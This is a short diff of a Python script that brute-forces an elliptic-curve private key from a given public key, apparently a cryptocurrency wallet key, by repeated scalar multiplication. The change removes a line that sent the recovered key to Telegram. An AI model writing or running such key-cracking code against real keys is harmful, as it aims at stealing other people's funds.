@@ -60,7 +60,7 @@ for i in range(1000000000):  # Limit iterations
     if scalar_mult(recovered_k, G, P) == (int(input_public_key[2:66], 16), int(input_public_key[66:], 16)):
         message = f"Success: Recovered Private Key = {recovered_k}"
         print(message)
-        send_telegram_message(message)
+    
         break
     
     private = recovered_k
